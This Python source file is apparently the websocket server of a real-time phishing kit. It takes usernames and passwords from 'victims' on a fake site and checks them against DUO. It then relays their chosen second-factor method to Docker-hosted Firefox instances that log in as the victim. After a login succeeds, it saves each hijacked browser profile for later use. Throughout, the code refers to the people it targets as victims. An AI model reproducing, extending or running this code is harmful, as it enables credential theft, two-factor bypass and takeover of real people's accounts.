#!/usr/bin/env python

# WS server example that synchronizes state across clients

import ssl
import pathlib
import threading
import asyncio
import json
import logging
import websockets
import random
import os
import signal
import sys
import time
import re

try: 
	import duo
except:
	from backend import duo
try: 
	from containers import docker
except: 
	from backend.containers import docker

logging.basicConfig()
sessions = {}
connected = set()
duoSite = None
backends = None 
firefox_home = None

def signal_handler(signal, frame):
	backends.close_all()
	time.sleep(1)
	print("Closed all docker instances. Ctrl+C again to close any remaining threads")
	sys.exit(0)

def log(*args):
	print( "SOCKET_SERVER:"+" ".join(map(str,args)))

async def close_tabs(SID):
	await sessions[SID]["backend"].send(json.dumps({"action":"closeTab"}));
	sessions[SID]["backend"] = None

async def claim_backend(SID, usr, pas, loop):
	try:
		bid = backends.claim_backend(SID, usr, pas) 
		if bid == -1: 
			log("No backends available")
			await sessions[SID]["victim"].close()

		if SID in sessions.keys():
			sessions[SID]["bid"] = 	bid
		else:
			log("Session", SID, "has died, so will release backend", bid, "that was just assigned to it")
			backends.release_backend(bid)
	finally:
		pass

def validate_creds(SID, usr, pas, loop):
	def callback(valid):
		if valid:
			loop.create_task(sessions[SID]["victim"].send(json.dumps({"status":"validCreds"})))
		else:
			loop.create_task(sessions[SID]["victim"].send(json.dumps({"status":"invalidCreds"})))
	#threading.Thread(target=duoSite.validateCreds, args=(usr, pas, callback)).start()
	duoSite.validateCreds(usr, pas, callback)
	
	'''
	try:
		if duoSite.validateCreds(usr, pas):
			loop.create_task(sessions[SID]["victim"].send(json.dumps({"status":"validCreds"})))
		else:
			loop.create_task(sessions[SID]["victim"].send(json.dumps({"status":"invalidCreds"})))
	finally:
		pass
		'''

def save_container(name, bid):
	try:
		# wait for victim to close connection by itself
		path = "/docker/appdata/firefoxSID" + str(bid) + "/profile"
		log("Appending profile", name, "with path", path, "to", firefox_home + "/profiles.ini")
		with open(firefox_home + "/profiles.ini", "r+") as profiles_file:
			profiles = profiles_file.read()
			next_num = max([int(x.split("e")[1]) for x in re.findall("Profile\d+", profiles)]) + 1
			profiles += "\n\n[Profile{}]\nName={}\nIsRelative=0\nPath={}".format(next_num, name, path)
			profiles_file.seek(0, os.SEEK_SET)
			profiles_file.write(profiles)
		backends.stop_backend(bid, name)
	finally:
		pass

async def counter(websocket, path):
	log("Websocket connected:", websocket,";", path)
	try:
		async for message in websocket:
			if websocket.state == 3: continue
			data = json.loads(message)
			if "ping" in data.keys():
				await websocket.send(json.dumps({"pong":"pong"}));
				continue;

			log("received: ", data)
			if data["id"] == "victim": 
				# victim gave us credentials. Create new session
				# and start a backend
				if data["action"] == "registerVictim":
					SID = data["sid"]
					if SID in sessions.keys(): 
						sessions[SID]["victim"] = websocket
						sessions[SID]["authm"] = None
						log("Victim with SID", SID, "and BID", sessions[SID]["bid"], "reconnected")
						await sessions[SID]["victim"].send(json.dumps({"status":"validCreds"}));
						continue

					sessions[SID] = {
							"victim" : websocket, 
							"backend": None, 
							"bid"	 : None, 
							"user"	 : data["username"],
							"pass"	 : data["password"],
							"authm"  : None,
							"authReady" : False,
							"succ"	 : False
					}

					log("Created new session", SID, "starting auth")
					# run this on separate thread to avoid blocking message pool
					validate_creds(SID, data["username"], data["password"], asyncio.get_event_loop())
					#threading.Thread(target=validate_creds, 
					#	args=(SID, data["username"], data["password"], asyncio.get_event_loop())).start()
					await claim_backend(SID, data["username"], data["password"], asyncio.get_event_loop())
					#threading.Thread(target=start_backend, 
						#args=(SID, data["username"], data["password"], asyncio.get_event_loop())).start()
	
					
				if data["action"] == "setAuthMethod":
					SID = data["sid"]
					sessions[SID]["authm"] = data["authm"]
					if sessions[SID]["authReady"] == True:
						log("backend is ready, so sending auth method") 
						await sessions[SID]["backend"].send(json.dumps({"status":"selected", "method":sessions[SID]["authm"]}))
					else: 
						log("backend is NOT ready, waiting to send auth method")

				if data["action"] == "cancelPressed":
					SID = data["sid"]	
					await sessions[SID]["backend"].send(json.dumps(data))

			elif data["id"] == "backend":
				SID = data["sid"]
				if SID not in sessions.keys(): 
					break

				# a new backend connected 
				if "action" in data and data["action"] == "requestVictim":
					if SID in sessions.keys():
						sessions[SID]["backend"] = websocket
					else:
						log("Failed to assign this new container to the victim, for it has died already")

				# backend validated given credentials. Send it auth method if user already decided it or set flag to ready whenever user deciedes
				if "status" in data and data["status"] == "waitingForAuthm":
					sessions[SID]["authReady"] = True
					log("Setting authready to true for", SID, ". Authm is: ", sessions[SID]["authm"])
					await sessions[SID]["victim"].send(json.dumps(data))
					if sessions[SID]["authm"] is not None:
						await sessions[SID]["backend"].send(json.dumps({"status":"selected", "method":sessions[SID]["authm"]}))

				if "status" in data and data["status"] == "loggedIn":
					log("Session SID<->BID<->USR :", SID + "<->" + str(sessions[SID]["bid"]) + sessions[SID]["user"], "successful.")
					sessions[SID]["succ"] = True
					bid = data["bid"]
					name = sessions[SID]["user"]

					await sessions[SID]["victim"].send(json.dumps({"status":"loggedIn"}));
					# run this on separate thread to avoid blocking message pool
					save_container(name, bid)
					#save_container(SID, asyncio.get_event_loop())

				if "status" in data and data["status"] == "callAnswered":
					await sessions[SID]["victim"].send(json.dumps(data))

			else:
				logging.error("unsupported ID: {}", data)
	finally:
		# unregister websocket that died
		for SID in list(sessions.keys()):

			# victim moved away from fake catsoup site
			if sessions[SID]["victim"] is websocket:
				log("victim", SID, "closing...")
				if sessions[SID]["succ"]:
					log("this victim was succesful. Not releasing backend.")
				else:
					backends.release_backend(sessions[SID]["bid"])
				del sessions[SID]

			# backend session died for some reason. Try to restart
			elif sessions[SID]["backend"] is websocket:
				log("backend SID<->BID :", SID + "<->" + str(sessions[SID]['bid']), "died.")
				sessions[SID]["backend"] = None
				backends.release_backend(sessions[SID]["bid"])
				if sessions[SID]["succ"] is False: 
					log("session wasn't succesfull, so retrying. Assigning new backend")
					sessions[SID]["bid"] = backends.claim_backend(SID, sessions[SID]["user"], sessions[SID]["pass"])

def startServer(host, hostname, firefox_path):
	global duoSite
	global backends
	global firefox_home
	firefox_home = firefox_path

	duoSite = duo.DUOAuth()
	backends = docker.Manager(hostname)

	ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
	key = os.path.abspath(os.path.join(os.path.dirname(__file__), '../ssl/key.pem'))
	crt = os.path.abspath(os.path.join(os.path.dirname(__file__), '../ssl/cert.pem'))
	print("Using key", key)
	print("Using certificate", crt)
	ssl_context.load_cert_chain(crt, keyfile=key)

	start_server = websockets.serve(counter, host, 80, ssl=ssl_context)

	print('Starting Socket Server on Port 80')
	signal.signal(signal.SIGINT, signal_handler)
	asyncio.get_event_loop().run_until_complete(start_server)
	asyncio.get_event_loop().run_forever()

if __name__ == "__main__":
	startServer(sys.argv[1], sys.argv[2], sys.argv[3])
